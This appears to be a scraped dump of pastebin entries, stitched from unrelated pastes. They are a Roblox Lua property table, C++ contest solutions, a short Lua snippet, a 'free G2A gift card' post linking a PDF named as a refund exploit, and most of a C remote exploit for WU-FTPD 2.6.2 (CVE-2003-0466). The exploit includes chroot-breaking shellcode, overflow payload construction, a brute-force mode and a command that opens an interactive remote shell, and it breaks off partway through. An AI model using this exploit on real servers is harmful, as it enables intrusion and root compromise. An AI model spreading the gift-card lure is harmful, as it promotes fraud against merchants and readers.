		[""MaxForce""] = Vector3.new(4000, 4000, 4000),
		[""P""] = 10000,
		[""Position""] = Vector3.new(0, 50, 0)
	},
	[""CylinderMesh""] = {
		[""Archivable""] = true,
		[""Name""] = ""Mesh"",
		[""Parent""] = ""nill"",
		[""Offset""] = Vector3.new(0, 0, 0),
		[""Scale""] = Vector3.new(1, 1, 1),
		[""VertexColor""] = Vector3.new(1, 1, 1)
	},
	[""ConeHandleAdornment""] = {
		[""Archivable""] = true,
		[""Name""] = ""ConeHandleAdornment"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Adornee""] = ""nill"",
		[""AlwaysOnTop""] = false,
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""SizeRelativeOffset""] = Vector3.new(0, 0, 0),
		[""ZIndex""] = -1,
		[""Height""] = 2,
		[""Radius""] = 0.5
	},
	[""FlagStand""] = {
		[""Archivable""] = true,
		[""Name""] = ""FlagStand"",
		[""Parent""] = ""nill"",
		[""Anchored""] = false,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Smooth,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Inlet,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Medium stone grey""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = true,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Smooth,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Smooth,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Smooth,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(4, 1.2000000476837158, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Studs,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0,
		[""Velocity""] = Vector3.new(0, 0, 0),
		[""Shape""] = Enum.PartType.Block,
		[""TeamColor""] = BrickColor.new(""Medium stone grey"")
	},
	[""Weld""] = {
		[""Archivable""] = true,
		[""Name""] = ""Weld"",
		[""Parent""] = ""nill"",
		[""C0""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""C1""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""Part0""] = ""nill"",
		[""Part1""] = ""nill""
	},
	[""BoolValue""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill"",
		[""Value""] = false
	},
	[""ClickDetector""] = {
		[""Archivable""] = true,
		[""Name""] = ""ClickDetector"",
		[""Parent""] = ""nill"",
		[""CursorIcon""] = """",
		[""MaxActivationDistance""] = 32
	},
	[""Frame""] = {
		[""Archivable""] = true,
		[""Name""] = ""Frame"",
		[""Parent""] = ""nill"",
		[""AutoLocalize""] = true,
		[""RootLocalizationTable""] = ""nill"",
		[""Active""] = false,
		[""AnchorPoint""] = Vector2.new(0, 0),
		[""BackgroundColor3""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""BackgroundTransparency""] = 0,
		[""BorderColor3""] = Color3.new(0.105882, 0.164706, 0.207843),
		[""BorderSizePixel""] = 1,
		[""ClipsDescendants""] = false,
		[""LayoutOrder""] = 0,
		[""NextSelectionDown""] = ""nill"",
		[""NextSelectionLeft""] = ""nill"",
		[""NextSelectionRight""] = ""nill"",
		[""NextSelectionUp""] = ""nill"",
		[""Position""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""Rotation""] = 0,
		[""Selectable""] = false,
		[""SelectionImageObject""] = ""nill"",
		[""Size""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""SizeConstraint""] = Enum.SizeConstraint.RelativeXY,
		[""Visible""] = true,
		[""ZIndex""] = 1,
		[""Style""] = Enum.FrameStyle.Custom
	},
	[""Dragger""] = {
		[""Archivable""] = true,
		[""Name""] = ""Dragger"",
		[""Parent""] = ""nill""
	},
	[""SurfaceLight""] = {
		[""Archivable""] = true,
		[""Name""] = ""SurfaceLight"",
		[""Parent""] = ""nill"",
		[""Brightness""] = 1,
		[""Color""] = Color3.new(1, 1, 1),
		[""Enabled""] = true,
		[""Shadows""] = false,
		[""Angle""] = 90,
		[""Face""] = Enum.NormalId.Front,
		[""Range""] = 16
	},
	[""Rotate""] = {
		[""Archivable""] = true,
		[""Name""] = ""Rotate"",
		[""Parent""] = ""nill"",
		[""C0""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""C1""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""Part0""] = ""nill"",
		[""Part1""] = ""nill""
	},
	[""CornerWedgePart""] = {
		[""Archivable""] = true,
		[""Name""] = ""CornerWedge"",
		[""Parent""] = ""nill"",
		[""Anchored""] = false,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Smooth,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Smooth,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Medium stone grey""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = true,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Smooth,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Smooth,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Smooth,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(2, 2, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Smooth,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0,
		[""Velocity""] = Vector3.new(0, 0, 0)
	},
	[""Keyframe""] = {
		[""Archivable""] = true,
		[""Name""] = ""Keyframe"",
		[""Parent""] = ""nill"",
		[""Time""] = 0
	}
}"
Q3pvtid8,D,Ankit_132,C++,Saturday 17th of February 2024 11:43:57 PM CDT,"#include <bits/stdc++.h>

using namespace std;

int main() {
    int t;
    cin>>t;
    
    while(t--){
        int n;
        string s;
        cin>>n>>s;
 
        int ans=0;
 
        for(int i=0; i<n; i++)
        {
            for(int j=i; j<n; j++)
            {
                for(int k=i; k<=j; k++)
                {
                    if(s[k]=='0')
                        continue;
 
                    ans++;
                    k+=2;
                }
            }
        }
 
        cout<<ans<<""\n"";
    }
}"
cCaRH4nj,C,Ankit_132,C++,Saturday 17th of February 2024 11:42:22 PM CDT,"#include <bits/stdc++.h>

using namespace std;

int main() {
    int t;
    cin>>t;
    
    while(t--){
        int n;
        cin>>n;
 
        vector<int> a(n);
        for(auto &e: a)     cin>>e;
 
        for(int i=0; i<n; i++)
            a[i] += i+1;
 
        sort(a.rbegin(), a.rend());
 
        int val = 2e9;
 
        for(auto e: a)
        {
            if(e >= val)
            {
                cout<<val-1<<"" "";
                val--;
            }
            else
            {
                cout<<e<<"" "";
                val = e;
            }
        }
 
        cout<<""\n"";
    }
}"
qsU02KqX,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Saturday 17th of February 2024 11:40:36 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_891374.pdf
 
Working as of
18 February 2024"
r4ywnqn0,B,Ankit_132,C++,Saturday 17th of February 2024 11:40:19 PM CDT,"#include <bits/stdc++.h>

using namespace std;

int main() {
    int t;
    cin>>t;
    
    while(t--){
        int n;
        cin>>n;
 
        set<int> st;
        for(int i=1; i<=n; i++)
            st.insert(i);
 
        for(int i=1; i<=n; i++)
        {
            if(i%2)
            {
                cout<<*st.begin()<<"" "";
                st.erase(st.begin());
            }
            else
            {
                cout<<*st.rbegin()<<"" "";
                st.erase(--st.end());
            }
        }
 
        cout<<""\n"";
    }
}"
xgYtJnzn,A,Ankit_132,C++,Saturday 17th of February 2024 11:38:44 PM CDT,"#include <bits/stdc++.h>

using namespace std;

int main() {
    int t;
    cin>>t;
    
    while(t--){
        int n;
        cin>>n;
 
        vector<int> v(2*n);
        for(auto &e: v)     cin>>e;
        
        sort(v.begin(), v.end());
 
        int ans = 0;
 
        for(int i=0; i<2*n; i+=2)
            ans += v[i];
 
        cout<<ans<<""\n"";
    }
}"
Bk1Rqwbb,Clear Welcomed Players,RazmaKaz,Lua,Saturday 17th of February 2024 10:45:40 PM CDT,"-- Clear welcomed players
io.open('welcomedPlayers.txt', 'w')
io.write('')
io.close()
"
AkRG6EGe,WU-FTPD 2.6.2 - Off-by-One Remote Command Execution - CVE-2003-0466,FlyFar,C,Saturday 17th of February 2024 10:25:18 PM CDT,"/*
**
**  wu-ftpd v2.6.2 off-by-one remote 0day exploit.
**
**       exploit by ""you dong-hun""(Xpl017Elz)
**  
**     Brute-Force function added.
**
*/

#define VERSION ""v0.0.3""
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define DEBUG_NG
#undef DEBUG_NG
#define NRL 0
#define SCS 1
#define FAD (-1)
#define MAX_BF (16)
#define BF_LSZ (0x100) /* 256 */
#define DEF_VA 255
#define DEF_PORT 21
#define DEF_ANSH 11
#define GET_HOST_NM_ERR (NULL)
#define SIN_ZR_SIZE 8
#define DEF_ALIGN 4
#define GET_R 5000
#define DEF_NOP 64
#define DEF_STR ""x0x""
#define HOME_DIR ""/home/""
#define DEF_HOST ""localhost""
#define DEF_COMM ""echo \""x82 is happy, x82 is happy, x82 is happy\"";"" \
""uname -a;id;export TERM=vt100;exec bash -i\n""
/* ftpd handshake */
#define FTP_CONN_SCS ""220""
#define FTP_USER_FAD ""331""
#define FTP_LOGIN_FAD ""530 Login incorrect.""
#define FTP_LOGIN_SCS ""230""
#define CWD_COMM_SCS ""250"" /* also, RMD command */
#define MKD_COMM_SCS ""257""
#define MKD_EXIST ""521""

void ftpd_login(int sock,char *user,char *pass);
void conn_shell(int conn_sock);
int setsock(char *u_host,int u_port);
void re_connt(int st_sock_va);
void prcode_usage(char *f_nm);
int mkd_cwd_f(int sock,int type,char *dir_nm,int gb_character);
int send_shellcode(int sock,int type,char *dir_nm);
void make_send_exploit(int sock,int type,u_long sh_addr,int d_type);
int make_retloc(int sock,int type,char *atk_bf,u_long sh_addr);
u_long null_chk(u_long sh_addr);
void banrl();

struct os
{
int num;
char *v_nm;
u_long sh_addr;
};
int t_g=(NRL);
char home_dir[(DEF_VA)]; /* user home directory offset */
/*
** `0xff' uses two times to be realized in our shellcode.
*/
char shellcode_ffx2[]=
/* setuid/chroot-break/execve shellcode by Lam3rZ */
""\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb\x43\x89""
""\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31\xc9\x8d\x5e\x01""
""\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01""
""\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9""
""\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31""
""\xc0\x88\x46\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe""
""\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89""
""\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0""
""\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31""
""\x2e\x2e\x31\x31"";

struct os plat[]=
{
/*
** I enjoy version up, will not share more. :-}
*/
{
0,""RedHat Linux 6.x Version wu-2.6.0(1) compile"",0x0806a59c
},
{
1,""RedHat Linux 6.x Version wu-2.6.1(1) compile"",0x0806aad8
},
{
2,""RedHat Linux 6.x Version wu-2.6.2(2) compile"",0x0806aa60
},
{
0x82,NULL,0x0
},
{
0x8282,""Brute-Force mode"",0x0806a082
}
};

void prcode_usage(char *f_nm)
{
int r_n=(NRL);
fprintf(stdout,"" Usage: %s -options arguments\n\n"",f_nm);
fprintf(stdout,"" \t-h [hostname] : Target hostname & ip.\n"");
fprintf(stdout,"" \t-u [userid] : User id.\n"");
fprintf(stdout,"" \t-p [passwd] : User password.\n"");
fprintf(stdout,"" \t-n [port num] : Target port number.\n"");
fprintf(stdout,"" \t-s [shelladdr] : Shellcode address.\n"");
fprintf(stdout,"" \t-b : Brute-Force mode.\n"");
fprintf(stdout,"" \t-m [max num] : Brute-Force Count number.\n"");
fprintf(stdout,"" \t-i : help information.\n"");
fprintf(stdout,"" \t-t [target num] : Select target number.\n\n"");
for(r_n=(NRL);plat[r_n].v_nm!=(NULL);r_n++)
{
fprintf(stdout,"" \t\t{%d} %s.\n"",(plat[r_n].num),(plat[r_n].v_nm));
}
fprintf(stdout,""\n Example: %s -hlocalhost -ux82 -px82 -n21 -t0\n\n"",f_nm);
exit(FAD);
}

u_long null_chk(u_long sh_addr)
{
if((sh_addr>>(NRL)&0xff)==(0x00))
{
return(sh_addr+=(SCS));
}
else return(sh_addr);
}

void ftpd_login(int sock,char *user,char *pass)
{
char send_recv[(GET_R)];

(u_int)sleep(SCS);
memset((char *)send_recv,(NRL),sizeof(send_recv));
recv(sock,send_recv,sizeof(send_recv)-1,(NRL));

if(!strstr(send_recv,(FTP_CONN_SCS)))
{
fprintf(stdout,"" [-] ftpd connection failure.\n\n"");
close(sock);
exit(FAD);
}
else fprintf(stdout,"" [*] ftpd connection success.\n"");
fprintf(stdout,"" [+] User id input.\n"");

memset((char *)send_recv,(NRL),sizeof(send_recv));
snprintf(send_recv,sizeof(send_recv)-1,""USER %s\r\n"",user);
send(sock,send_recv,strlen(send_recv),(NRL));

(u_int)sleep(SCS);
memset((char *)send_recv,(NRL),sizeof(send_recv));
recv(sock,send_recv,sizeof(send_recv)-1,(NRL));

if(!strstr(send_recv,(FTP_USER_FAD)))
{
fprintf(stdout,"" [-] User id input failure.\n\n"");
close(sock);
exit(FAD);
}
else fprintf(stdout,"" [+] User password input.\n"");

memset((char *)send_recv,(NRL),sizeof(send_recv));
snprintf(send_recv,sizeof(send_recv)-1,""PASS %s\r\n"",pass);
send(sock,send_recv,strlen(send_recv),(NRL));

(u_int)sleep(SCS);
memset((char *)send_recv,(NRL),sizeof(send_recv));
recv(sock,send_recv,sizeof(send_recv)-1,(NRL));

if(strstr(send_recv,(FTP_LOGIN_FAD)))
{
fprintf(stdout,"" [-] FAILED LOGIN on %s.\n\n"",user);
close(sock);
exit(FAD);
}
else if(strstr(send_recv,(FTP_LOGIN_SCS)))
{
fprintf(stdout,"" [*] User %s logged in.\n"",user);
}
else
{
fprintf(stdout,"" [-] ftpd handshake failure.\n\n"");
close(sock);
exit(FAD);
}
return;
}

int mkd_cwd_f(int sock,int type,char *dir_nm,int gb_character)
{
int dr_n=(NRL),cmd_f=(NRL);
char get_nm[(GET_R)];

memset((char *)dir_nm,(NRL),(GET_R));
/* MKD command */
dir_nm[cmd_f++]=(0x4d);
dir_nm[cmd_f++]=(0x4b);
dir_nm[cmd_f++]=(0x44);
dir_nm[cmd_f++]=(0x20);

for(dr_n=(cmd_f);dr_n<(DEF_VA)+(cmd_f);dr_n++)
{
dir_nm[dr_n]=(gb_character);
}
dir_nm[dr_n++]=(0x0d);
dir_nm[dr_n++]=(0x0a);

if(type)
{
send(sock,dir_nm,strlen(dir_nm),(NRL));
(u_int)sleep(SCS);
memset((char *)get_nm,(NRL),sizeof(get_nm));
recv(sock,get_nm,sizeof(get_nm)-1,(NRL));

if(!strstr(get_nm,(MKD_COMM_SCS))&&!strstr(get_nm,(MKD_EXIST)))
{
fprintf(stdout,"" [-] MKD command failed.\n\n"");
exit(FAD);
}
}
/* CMD command */
cmd_f=(NRL);
dir_nm[cmd_f++]=(0x43);
dir_nm[cmd_f++]=(0x57);
dir_nm[cmd_f++]=(0x44);

send(sock,dir_nm,strlen(dir_nm),(NRL));
(u_int)sleep(SCS);
memset((char *)get_nm,(NRL),sizeof(get_nm));
recv(sock,get_nm,sizeof(get_nm)-1,(NRL));

if(!strstr(get_nm,(CWD_COMM_SCS)))
{
fprintf(stdout,"" [-] CWD command failed.\n\n"");
exit(FAD);
}
return;
}

int send_shellcode(int sock,int type,char *dir_nm)
{
int dr_n=(NRL),cmd_f=(NRL);
char get_nm[(GET_R)];

memset((char *)dir_nm,(NRL),(GET_R));
/* MKD command */
dir_nm[cmd_f++]=(0x4d);
dir_nm[cmd_f++]=(0x4b);
dir_nm[cmd_f++]=(0x44);
dir_nm[cmd_f++]=(0x20);

for(dr_n=(cmd_f);dr_n<(DEF_VA)+sizeof(0xffffffff)+(cmd_f)-strlen(shellcode_ffx2);dr_n++)
{
dir_nm[dr_n]=(DEF_NOP);
}
for(cmd_f=(NRL);cmd_f<strlen(shellcode_ffx2);cmd_f++)
{
dir_nm[dr_n++]=shellcode_ffx2[cmd_f];
}
dir_nm[dr_n++]=(0x0d);
dir_nm[dr_n++]=(0x0a);

if(type)
{
send(sock,dir_nm,strlen(dir_nm),(NRL));
(u_int)sleep(SCS);
memset((char *)get_nm,(NRL),sizeof(get_nm));
recv(sock,get_nm,sizeof(get_nm)-1,(NRL));

if(!strstr(get_nm,(MKD_COMM_SCS))&&!strstr(get_nm,(MKD_EXIST)))
{
fprintf(stdout,"" [-] MKD shellcode_dir failed.\n\n"");
exit(FAD);
}
}
/* CMD command */
cmd_f=(NRL);
dir_nm[cmd_f++]=(0x43);
dir_nm[cmd_f++]=(0x57);
dir_nm[cmd_f++]=(0x44);

send(sock,dir_nm,strlen(dir_nm),(NRL));
(u_int)sleep(SCS);
memset((char *)get_nm,(NRL),sizeof(get_nm));
recv(sock,get_nm,(GET_R)-1,(NRL));

if(!strstr(get_nm,(CWD_COMM_SCS)))
{
fprintf(stdout,"" [-] CWD shellcode_dir failed.\n\n"");
exit(FAD);
}
return;
}

void make_send_exploit(int sock,int type,u_long sh_addr,int d_type)
{
char atk_bf[(GET_R)];
{
fprintf(stdout,"" [+] 01: make 0x41414141 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x41)); /* 01 */
fprintf(stdout,"" [+] 02: make shell-code directory.\n"");
(int)send_shellcode(sock,d_type,(atk_bf)); /* 02 */
fprintf(stdout,"" [+] 03: make 0x43434343 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x43)); /* 03 */
fprintf(stdout,"" [+] 04: make 0x44444444 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x44)); /* 04 */
fprintf(stdout,"" [+] 05: make 0x45454545 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x45)); /* 05 */
fprintf(stdout,"" [+] 06: make 0x46464646 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x46)); /* 06 */
fprintf(stdout,"" [+] 07: make 0x47474747 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x47)); /* 07 */
fprintf(stdout,"" [+] 08: make 0x48484848 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x48)); /* 08 */
fprintf(stdout,"" [+] 09: make 0x49494949 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x49)); /* 09 */
fprintf(stdout,"" [+] 10: make 0x50505050 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x50)); /* 10 */
fprintf(stdout,"" [+] 11: make 0x51515151 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x51)); /* 11 */
fprintf(stdout,"" [+] 12: make 0x52525252 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x52)); /* 12 */
fprintf(stdout,"" [+] 13: make 0x53535353 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x53)); /* 13 */
fprintf(stdout,"" [+] 14: make 0x54545454 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x54)); /* 14 */
fprintf(stdout,"" [+] 15: make 0x55555555 directory.\n"");
(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x55)); /* 15 */
(int)make_retloc(sock,type,(atk_bf),sh_addr); /* 16 */
}
return;
}

int make_retloc(int sock,int type,char *atk_bf,u_long sh_addr)
{
int r_rn_1=(NRL),r_rn_2=(NRL),cmd_f=(NRL);
char get_nm[(GET_R)];

memset((char *)atk_bf,(NRL),(GET_R));
if(type) /* MKD command */
{
atk_bf[cmd_f++]=(0x4d);
atk_bf[cmd_f++]=(0x4b);
atk_bf[cmd_f++]=(0x44);
atk_bf[cmd_f++]=(0x20);
}
else /* RMD command */
{
atk_bf[cmd_f++]=(0x52);
atk_bf[cmd_f++]=(0x4d);
atk_bf[cmd_f++]=(0x44);
atk_bf[cmd_f++]=(0x20);
}
for(r_rn_1=(cmd_f),r_rn_2=(NRL);r_rn_2<(DEF_VA)-strlen(home_dir)-(DEF_ANSH);r_rn_2++)
atk_bf[r_rn_1++]=(0x41);
{
*(long *)&atk_bf[r_rn_1]=(sh_addr);
r_rn_1+=(DEF_ALIGN);
*(long *)&atk_bf[r_rn_1]=(sh_addr);
r_rn_1+=(DEF_ALIGN);
atk_bf[r_rn_1++]=(0x41);
atk_bf[r_rn_1++]=(0x41);
atk_bf[r_rn_1++]=(0x41);
atk_bf[r_rn_1++]=(0x0d);
atk_bf[r_rn_1++]=(0x0a);
}
send(sock,atk_bf,strlen(atk_bf),(NRL));
(u_int)sleep(SCS);
memset((char *)get_nm,(NRL),sizeof(get_nm));
recv(sock,get_nm,sizeof(get_nm)-1,(NRL));

if(type) /* MKD command */
{
if(!strstr(get_nm,(MKD_COMM_SCS))&&!strstr(get_nm,(MKD_EXIST)))
{
fprintf(stdout,"" [-] MKD &shellcode_dir failed.\n\n"");
exit(FAD);
}
else fprintf(stdout,"" [+] Ok, MKD &shellcode_dir.\n"");
}
else /* RMD command */
{
if(!strstr(get_nm,(CWD_COMM_SCS)))
{
fprintf(stdout,"" [-] RMD &shellcode_dir failed.\n\n"");
exit(FAD);
}
else fprintf(stdout,"" [+] Ok, RMD &shellcode_dir.\n"");
}
return;
}

int main(int argc,char *argv[])
{
int opt_g,sock,__bf=(NRL);
int mx_bf=(MAX_BF),bf_lsz=(BF_LSZ);
char user_id[(DEF_VA)]=(DEF_STR);
char pass_wd[(DEF_VA)]=(DEF_STR);
char tg_host[(DEF_VA)]=(DEF_HOST);
int tg_port=(DEF_PORT);
u_long sh_addr=(plat[t_g].sh_addr);

(void)banrl();
while((opt_g=getopt(argc,argv,""M:m:H:h:U:u:P:p:N:n:S:s:T:t:BbIi""))!=EOF)
{
extern char *optarg;
switch(opt_g)
{
case 'M':
case 'm':
mx_bf=(atoi(optarg));
bf_lsz=((0x1000)/mx_bf);
break;

case 'H':
case 'h':
memset((char *)tg_host,(NRL),sizeof(tg_host));
strncpy(tg_host,optarg,sizeof(tg_host)-1);
break;

case 'U':
case 'u':
memset((char *)user_id,(NRL),sizeof(user_id));
strncpy(user_id,optarg,sizeof(user_id)-1);
break;

case 'P':
case 'p':
memset((char *)pass_wd,(NRL),sizeof(pass_wd));
strncpy(pass_wd,optarg,sizeof(pass_wd)-1);
break;

case 'N':
case 'n':
tg_port=(atoi(optarg));
break;

case 'S':
case 's':
sh_addr=strtoul(optarg,(NRL),(NRL));
break;

case 'T':
case 't':
if((t_g=(atoi(optarg)))<(3))
sh_addr=(plat[t_g].sh_addr);
else (void)prcode_usage(argv[(NRL)]);
break;

case 'B':
case 'b':
__bf=(SCS);
break;

case 'I':
case 'i':
(void)prcode_usage(argv[(NRL)]);
break;

case '?':
(void)prcode_usage(argv[(NRL)]);
break;
}
}
if(!strcmp(user_id,(DEF_STR))||!strcmp(pass_wd,(DEF_STR)))
(void)prcode_usage(argv[(NRL)]);

memset((char *)home_dir,(NRL),sizeof(home_dir));
snprintf(home_dir,sizeof(home_dir)-1,""%s%s"",(HOME_DIR),user_id);

if(!__bf)
{
fprintf(stdout,"" [*] Target: %s.\n"",(plat[t_g].v_nm));
fprintf(stdout,"" [+] address: %p.\n"",sh_addr);
fprintf(stdout,"" [*] #1 Try, %s:%d ..."",tg_host,tg_port);
fflush(stdout);

sock=(int)setsock(tg_host,tg_port);
(void)re_connt(sock);
fprintf(stdout,"" [ OK ]\n"");

fprintf(stdout,"" [1] ftpd connection login.\n"");
(void)ftpd_login(sock,user_id,pass_wd);

fprintf(stdout,"" [2] send exploit code.\n"");
(void)make_send_exploit(sock,(SCS),sh_addr,(SCS));
close(sock);

fprintf(stdout,"" [+] #2 Try, %s:%d ..."",tg_host,tg_port);
fflush(stdout);

sock=(int)setsock(tg_host,tg_port);
(void)re_connt(sock);
fprintf(stdout,"" [ OK ]\n"");

fprintf(stdout,"" [3] ftpd connection login.\n"");
(void)ftpd_login(sock,user_id,pass_wd);

fprintf(stdout,"" [4] send exploit code.\n"");
(void)make_send_exploit(sock,(NRL),sh_addr,(NRL));

fprintf(stdout,"" [5] Waiting, execute the shell "");
fflush(stdout);
(u_int)sleep(SCS);

fprintf(stdout,""."");
fflush(stdout);
(u_int)sleep(SCS);

fprintf(stdout,""."");
fflush(stdout);
(u_int)sleep(SCS);

fprintf(stdout,"".\n"");
(void)conn_shell(sock);
close(sock);
}
else
{
int bt_num=(NRL);
t_g=(4);
sh_addr=(plat[t_g].sh_addr);
fprintf(stdout,"" [*] Brute-Force mode.\n"");
fprintf(stdout,"" [+] BF Count: %d.\n"",mx_bf);
fprintf(stdout,"" [+] BF Size: +%d.\n\n"",bf_lsz);

for(bt_num=(NRL);bt_num<(mx_bf);bt_num++)
{
sh_addr=(u_long)null_chk(sh_addr);
fprintf(stdout,"" [+] Brute-Force address: %p.\n"",sh_addr);
fprintf(stdout,"" [*] #1 Try, %s:%d ..."",tg_host,tg_port);
fflush(stdout);

sock=(int)setsock(tg_host,tg_port);
(void)re_connt(sock);
fprintf(stdout,"" [ OK ]\n"");

fprintf(stdout,"" [1] ftpd connection login.\n"");
(void)ftpd_login(sock,user_id,pass_wd);

fprintf(stdout,"" [2] send exploit code.\n"");
if(bt_num==(NRL))
{
(void)make_send_exploit(sock,(SCS),sh_addr,(SCS));
}
else
{
(void)make_send_exploit(sock,(SCS),sh_addr,(NRL));
}
close(sock);

fprintf(stdout,"" [+] #2 Try, %s:%d ..."",tg_host,tg_port);
fflush(stdout);

sock=(int)setsock(tg_host,tg_port);
(void)re_connt(sock);
fprintf(stdout,"" [ OK ]\n"");

fprintf(stdout,"" [3] ftpd connection login.\n"");
(void)ftpd_login(sock,user_id,pass_wd);

fprintf(stdout,"" [4] send exploit code.\n"");
(void)make_send_exploit(sock,(NRL),sh_addr,(NRL));

fprintf(stdout,"" [5] Waiting, execute the shell "");
fflush(stdout);
(u_int)sleep(SCS);

fprintf(stdout,""."");
fflush(stdout);
(u_int)sleep(SCS);

fprintf(stdout,""."");
fflush(stdout);
(u_int)sleep(SCS);

fprintf(stdout,"".\n"");
(void)conn_shell(sock);
close(sock);

sh_addr+=(bf_lsz);
}
}
exit(NRL);
}

int setsock(char *u_host,int u_port)
{
int sock;
struct hostent *sxp;
struct sockaddr_in sxp_addr;

if((sxp=gethostbyname(u_host))==(GET_HOST_NM_ERR))
{
return(FAD);
}
